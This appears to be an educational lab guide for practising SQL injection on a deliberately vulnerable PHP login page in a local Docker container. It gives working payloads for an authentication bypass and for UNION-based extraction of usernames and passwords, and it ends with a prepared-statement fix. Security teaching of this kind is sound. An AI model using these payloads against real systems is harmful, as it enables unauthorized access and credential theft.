# SQL Injection Testing Guide

## Introduction
This guide provides step-by-step instructions on how to set up and perform SQL Injection on a vulnerable PHP-based login page running in a Docker container with a MariaDB database.

---

## Prerequisites
Before you begin, ensure you have:
- Docker installed on Windows or Ubuntu.
- The vulnerable login system running via `docker-compose`.

---

## Setup Instructions
### 1. Start the Docker Containers
Run the following command inside the project directory:
```sh
cd C:\my-sqli-lab  # Change directory (Windows)
# or
cd ~/my-sqli-lab  # Change directory (Linux)

docker-compose up -d  # Start containers
```
This will start both the **MariaDB** and **Apache/PHP** containers.

### 2. Access the Vulnerable Login Page
Open your web browser and go to:
```
http://localhost:8080/login.php
```
You should see a basic login form with **username** and **password** fields.

---

## Performing SQL Injection
The login form is vulnerable because it directly inserts user input into an SQL query without proper sanitization.

### 1. Bypassing Authentication
#### **Attack Payload:**
```
Username: ' OR 1=1; #
Password: (anything)
```
#### **Explanation:**
- `' OR 1=1` always evaluates to **true**, allowing login bypass.
- `#` is a comment in SQL, which ignores the rest of the query.
Note: Mariadb uses #, other SQL flavors might use --

### 2. Extracting User Data
#### **Attack Payload:**
```
Username: ' UNION SELECT null, username, password FROM users; --
Password: (anything)
```
#### **Explanation:**
- This UNION query combines the login check with a request for all usernames and passwords from the database.

### 3. Checking for SQL Errors
Try entering:
```
Username: '
Password: (anything)
```
If the server returns an **SQL syntax error**, it confirms the vulnerability.

---

## How to Stop the Containers
When done testing, stop the containers using:
```sh
docker-compose down
```
To remove all stored data (reset the database):
```sh
docker-compose down -v
```

---

## Preventing SQL Injection
To fix this vulnerability, use **prepared statements** in PHP instead of directly inserting user input into SQL queries.

Example (secure version):
```php
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();
```

---

## Disclaimer
This setup is for **educational purposes only**. Do not use SQL injection on unauthorized systems.

## Author
Raul Alejandro Vargas Acosta (alejandro.vargas@erau.edu)